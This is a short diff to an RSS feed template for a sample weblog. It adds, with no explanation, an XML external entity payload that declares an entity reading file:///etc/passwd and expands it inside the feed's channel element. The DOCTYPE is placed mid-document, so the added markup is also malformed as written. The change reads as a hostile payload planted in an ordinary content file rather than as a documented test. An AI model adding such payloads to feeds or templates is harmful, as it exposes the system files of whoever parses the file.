@@ -5,7 +5,11 @@
   xmlns:admin="http://webns.net/mvcb/"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
 
+  
 <channel>
+<!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 <title>My weblog</title>
 <link>http://www.example.com/</link>
 <description>My cute tagline</description>
